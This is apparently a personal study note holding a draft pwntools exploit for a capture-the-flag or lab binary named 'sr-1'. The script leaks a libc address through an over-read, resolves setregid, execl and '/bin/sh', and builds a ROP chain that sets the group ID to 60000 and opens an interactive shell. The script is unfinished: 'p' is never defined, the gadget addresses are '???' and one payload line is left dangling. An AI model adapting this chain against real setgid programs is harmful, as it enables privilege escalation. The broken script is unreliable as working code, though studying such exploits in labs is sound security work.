---
tags: 
excalidraw-css:
---
0:
- +231 offset from `libc_start_main` 
```python
from pwn import *
e = ELF('./sr-1')

# how much do you want to dump?
offset_to_libc_start_main_231 = b'192'

# parsing recv'd buffer
m = p.recvuntil(b"print?\n")

p.sendline(b"192")

buf = p.recvuntil(b"Please")[:-6]

libc231 = u64(buf[-8:])
libc_start_main = libc231 - 231

libc = ELF(p.libc.path)
libc_addr = libc_start_main - libc.symbols['__libc_start_main']

setregid_offset = libc.symbols['setregid']
setregid_addr = libc_addr + setregid_offset

execl_offset = libc.symbols['execl']
execl_addr = libc_addr + execl_offset

str_offset = libc.data.find(b"/bin/sh")
str_addr = libc_addr + str_offset

# use ROP gadget
p_rdi_r = ???
p_rsi_r15_r = ???

payload = cyclic(136)
payload += p64(p_rdi_r) + p64(60000) + p64(p_rsi_r15_r) + p64(60000) + p64(60000) + p64(setregid_addr)
payload += 

p.sendline(payload)
p.interactive()
```